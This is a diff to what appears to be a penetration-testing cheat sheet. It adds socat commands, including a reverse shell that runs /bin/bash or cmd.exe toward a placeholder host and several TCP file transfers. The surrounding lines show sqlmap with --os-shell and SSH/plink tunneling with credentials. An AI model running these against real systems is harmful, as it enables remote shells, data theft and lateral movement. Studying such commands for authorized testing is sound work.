@@ -41,6 +41,13 @@
   * -p is the source port
   * -n prevents DNS lookups on addresses, hostnames, and ports
 
+# [socat](https://127.0.0.1):
+#### `socat - TCP4:X.X.X.X:YYY`
+#### `socat TCP4-listen:YYY STDOUT`
+#### `socat TCP4:X.X.X.X:YYY EXEC:(/bin/bash or cmd.exe)`
+#### `socat TCP4-listen:YYY,fork file:name.txt`
+#### `socat TCP4:X.X.X.X:YYY file:name.txt,create`
+
 # [sqlmap](https://web.archive.org/web/20191201191308/https://github.com/sqlmapproject/sqlmap/wiki/Introduction):
 #### `sqlmap -u X.X.X.X --crawl=1`
 #### `sqlmap -u X.X.X.X/resource.php --dbms=mysql --os-shell`
@@ -54,4 +61,4 @@
 #### `plink -l <username> -pw <password> X.X.X.X -R YYY:A.A.A.A:BBB`
 #### `ssh -D YYY <username>@X.X.X.X`
   * -R binds a remote server's (X.X.X.X) port (YYY) to the local server's (A.A.A.A) port (BBB) using the remote server's credentials
-  * -D specifies a local dynamic application-level port forwarder
+  * -D specifies a local dynamic application-level port forwarder for tunneling
